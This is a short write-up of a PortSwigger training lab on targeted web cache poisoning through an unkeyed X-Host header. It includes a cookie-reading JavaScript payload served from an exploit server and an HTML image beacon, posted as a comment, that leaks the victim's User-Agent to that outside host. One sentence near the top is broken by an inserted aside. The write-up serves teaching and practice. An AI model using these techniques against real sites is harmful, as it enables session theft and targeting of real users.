# Lab 09 — Targeted web cache poisoning using an unknown header

> **Expert** · [Official lab](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header)

**Entry point:** `X-Host` (found by Param Miner) drives the

> **Burp Community alternative (free):** the tool named below is Pro-only — the free replacement is described in the steps.
`/resources/js/tracking.js` import — and the cache varies on `User-Agent`.

## Solution

1. Param Miner → *Guess headers* finds the unkeyed `X-Host`; it rewrites
   the tracking.js import URL. Host your payload as
   `/resources/js/tracking.js` on the exploit server:

```js
alert(document.cookie)
```

2. Poison with a buster + `X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
   until `X-Cache: hit`.
3. The cache `Vary: User-Agent` means the poison only serves the victim's
   UA. Steal it: post a comment with

```html
<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
```

4. Read the victim's User-Agent from the exploit server **Access log**,
   set it as your Repeater request's UA, remove the buster, and re-poison.
5. The victim imports your tracking.js — lab solved.

## Notes

"Targeted" poisoning: when the cache varies on something, learn that value
about your victim (here: UA via an img beacon) and inject accordingly.
